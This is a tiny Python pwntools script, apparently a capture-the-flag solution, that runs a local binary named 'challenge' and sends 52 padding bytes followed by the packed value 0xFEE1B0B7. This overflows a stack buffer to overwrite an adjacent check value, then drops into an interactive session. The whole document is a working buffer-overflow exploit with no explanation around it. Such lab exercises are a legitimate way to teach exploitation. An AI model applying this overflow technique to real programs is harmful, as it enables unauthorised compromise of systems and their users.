from pwn import *

p = process('./challenge')


payload="A"*52
payload+=p32(0xFEE1B0B7)

p.sendline(payload)

p.interactive()
